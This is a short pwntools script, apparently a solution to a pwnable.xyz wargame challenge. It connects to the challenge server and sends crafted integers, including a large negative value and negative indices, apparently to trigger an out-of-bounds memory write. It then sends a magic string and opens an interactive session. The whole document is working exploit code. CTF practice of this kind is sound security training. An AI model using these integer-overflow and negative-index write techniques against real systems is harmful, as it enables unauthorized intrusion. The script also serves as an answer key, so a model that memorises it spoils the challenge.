from pwn import *

r = remote('svc.pwnable.xyz',30003)
r.sendline(str(0xb500000000000000-0x10000000000000000)+' '+str(0)+' '+str(-6))
r.sendline(str(0xb000000)+' '+str(0)+' '+str(-5))
r.sendline('M30W')
r.interactive()
